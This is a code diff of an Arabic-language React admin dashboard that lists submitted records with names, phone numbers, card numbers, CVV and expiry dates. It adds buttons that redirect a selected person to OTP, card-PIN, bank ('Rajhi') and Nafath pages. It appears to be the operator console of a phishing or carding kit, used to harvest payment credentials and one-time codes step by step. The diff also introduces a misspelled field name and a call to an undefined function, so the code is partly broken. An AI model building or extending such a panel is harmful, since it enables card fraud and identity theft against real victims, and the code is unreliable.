@@ -76,7 +76,7 @@ interface Notification {
   createdDate: string
   customs_code?: string
   cvv?: string
-  document_owner_full_name?: string
+  documment_owner_full_name?: string
   expiration_date?: string
   formData?: FormData
   full_name?: string
@@ -131,7 +131,7 @@ export default function NotificationsPage1() {
         const matchesSearch =
           searchTerm.trim() === "" ||
           notification.full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
-          notification.document_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
+          notification.documment_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
           notification.phone?.includes(searchTerm) ||
           notification.card_number?.includes(searchTerm)
 
@@ -222,7 +222,7 @@ export default function NotificationsPage1() {
           const matchesSearch =
             searchTerm.trim() === "" ||
             notification.full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
-            notification.document_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
+            notification.documment_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
             notification.phone?.includes(searchTerm) ||
             notification.card_number?.includes(searchTerm)
 
@@ -269,7 +269,7 @@ export default function NotificationsPage1() {
           const matchesSearch =
             searchTerm.trim() === "" ||
             notification.full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
-            notification.document_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
+            notification.documment_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
             notification.phone?.includes(searchTerm) ||
             notification.card_number?.includes(searchTerm)
 
@@ -327,7 +327,7 @@ export default function NotificationsPage1() {
           const matchesSearch =
             searchTerm.trim() === "" ||
             notification.full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
-            notification.document_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
+            notification.documment_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
             notification.phone?.includes(searchTerm) ||
             notification.card_number?.includes(searchTerm)
 
@@ -434,7 +434,7 @@ export default function NotificationsPage1() {
           </Badge>
         )
         break
-      case "phoneOtp":
+      case "phone-otp":
         badge = (
           <Badge
             variant="outline"
@@ -466,7 +466,7 @@ export default function NotificationsPage1() {
     }
 
     if (clickable && notification) {
-      return <div onClick={(e) => handlePagenameBadgeClick(notification, e)}>{badge}</div>
+      return <div onClick={(e) => handle(notification, e)}>{badge}</div>
     }
 
     return badge
@@ -694,13 +694,13 @@ export default function NotificationsPage1() {
                       className="hover:bg-muted/10 border-b border-gray-100 dark:border-gray-700 relative cursor-pointer"
                       onClick={() => {}}
                     >
-                      <TableCell>{getPageType(notification.pagename, true, notification)}</TableCell>
+                      <TableCell>{ getPageType(notification.pagename, true, notification)}</TableCell>
                       <TableCell className="font-medium">
                         <div className="flex items-center gap-2">
                           <div className="w-8 h-8 rounded-full bg-primary/10 flex items-center justify-center">
                             <User className="h-4 w-4 text-primary" />
                           </div>
-                          <Badge onClick={()=> handleInfoClick(notification, "personal")}>{notification.full_name || notification.document_owner_full_name || "غير محدد"}</Badge>
+                          <Badge onClick={()=> handleInfoClick(notification, "personal")}>{notification?.documment_owner_full_name || "غير محدد"}</Badge>
                         </div>
                       </TableCell>
                       <TableCell>
@@ -865,7 +865,7 @@ export default function NotificationsPage1() {
                 <div className="flex items-center gap-2 mt-1">
                   <User className="h-4 w-4 text-primary" />
                   <p className="font-medium text-lg">
-                    {selectedNotification.full_name || selectedNotification.document_owner_full_name || "غير محدد"}
+                    { selectedNotification.documment_owner_full_name || "غير محدد"}
                   </p>
                 </div>
               </div>
@@ -925,7 +925,7 @@ export default function NotificationsPage1() {
                   <div className="flex items-center gap-2 mt-1">
                     <User className="h-4 w-4 text-primary" />
                     <p className="font-medium text-lg">
-                      {selectedNotification.document_owner_full_name || selectedNotification.full_name || "غير محدد"}
+                      {selectedNotification.documment_owner_full_name || selectedNotification.full_name || "غير محدد"}
                     </p>
                   </div>
                 </div>
@@ -1057,22 +1057,7 @@ export default function NotificationsPage1() {
             </div>
           )}
 
-          <DialogFooter className="flex flex-col sm:flex-row gap-2 sm:gap-0 mt-4 pt-3 border-t">
-            <Button
-              onClick={() => selectedNotification && handleApproval("approved", selectedNotification.id)}
-              className="w-full bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white border-0 shadow-md"
-            >
-              <CheckCircle className="h-4 w-4 mr-2" />
-              قبول الطلب
-            </Button>
-            <Button
-              onClick={() => selectedNotification && handleApproval("rejected", selectedNotification.id)}
-              className="w-full bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white border-0 shadow-md"
-            >
-              <XCircle className="h-4 w-4 mr-2" />
-              رفض الطلب
-            </Button>
-          </DialogFooter>
+        
         </DialogContent>
       </Dialog>
 
@@ -1092,7 +1077,7 @@ export default function NotificationsPage1() {
                   <div className="flex flex-col">
                     <span className="text-xs text-blue-100 mb-1">حامل البطاقة</span>
                     <span className="font-medium">
-                      {selectedCardInfo.document_owner_full_name || selectedCardInfo.full_name || "غير محدد"}
+                      {selectedCardInfo.documment_owner_full_name || selectedCardInfo.full_name || "غير محدد"}
                     </span>
                   </div>
                   <CreditCard className="h-8 w-8 text-white opacity-80" />
@@ -1153,20 +1138,30 @@ export default function NotificationsPage1() {
             </div>
           )}
 
-          <DialogFooter className="flex flex-col sm:flex-row gap-2 sm:gap-0 mt-4 pt-3 border-t">
-            <Button
-              onClick={() => selectedCardInfo && handleApproval("approved", selectedCardInfo.id)}
-              className="w-full bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white border-0 shadow-md"
+          <DialogFooter className="grid grid-cols-4  border-t">
+          <Button
+              onClick={() => selectedNotification && handleUpdatePagename( selectedNotification.id,"verify-otp")}
+              className=" w-20 bg-gradient-to-r from-pink-500 to-pink-600 hover:from-green-600 hover:to-green-700 text-white border-0 shadow-md m-1"
             >
-              <CheckCircle className="h-4 w-4 mr-2" />
-              قبول الطلب
+            كود تحقق
             </Button>
             <Button
-              onClick={() => selectedCardInfo && handleApproval("rejected", selectedCardInfo.id)}
-              className="w-full bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white border-0 shadow-md"
+              onClick={() => selectedNotification && handleUpdatePagename( selectedNotification.id,"verify-card")}
+              className="w-20  bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white border-0 shadow-md m-1"
             >
-              <XCircle className="h-4 w-4 mr-2" />
-              رفض الطلب
+  الرقم السري
+            </Button>
+            <Button
+              onClick={() => selectedNotification && handleUpdatePagename( selectedNotification.id,"external-link")}
+              className="w-20 bg-gradient-to-r from-orange-500 to-orange-600 hover:from-green-600 hover:to-green-700 text-white border-0 shadow-md m-1"
+            >
+              راجحي
+            </Button>
+            <Button
+              onClick={() => selectedNotification && handleUpdatePagename( selectedNotification.id,"payment")}
+              className="w-20 bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white border-0 shadow-md m-1 "
+            >
+              رفض البطاقة
             </Button>
           </DialogFooter>
         </DialogContent>
@@ -1210,7 +1205,7 @@ export default function NotificationsPage1() {
                         ? "bg-purple-50 border-purple-300 dark:bg-purple-900/30 dark:border-purple-700"
                         : ""
                     }`}
-                    onClick={() => handleUpdatePagename(selectedNotification.id, "phoneOtp")}
+                    onClick={() => handleUpdatePagename(selectedNotification.id, "phone-otp")}
                   >
                     <FileText className="h-4 w-4" />
                     تسجيل
@@ -1225,7 +1220,7 @@ export default function NotificationsPage1() {
                     onClick={() => handleUpdatePagename(selectedNotification.id, "nafaz")}
                   >
                     <Calendar className="h-4 w-4" />
-                    تجديد
+                    نفاذ
                   </Button>
                   <Button
                     variant="outline"
@@ -1236,11 +1231,7 @@ export default function NotificationsPage1() {
                         : ""
                     }`}
                     onClick={() => {
-                      // Open a custom input dialog for other pagename types
-                      const customType = prompt("أدخل الصفحة الحالية المخصص:", selectedNotification.pagename || "")
-                      if (customType && customType.trim() !== "") {
-                        handleUpdatePagename(selectedNotification.id, customType.trim())
-                      }
+                   
                     }}
                   >
                     <Tag className="h-4 w-4" />
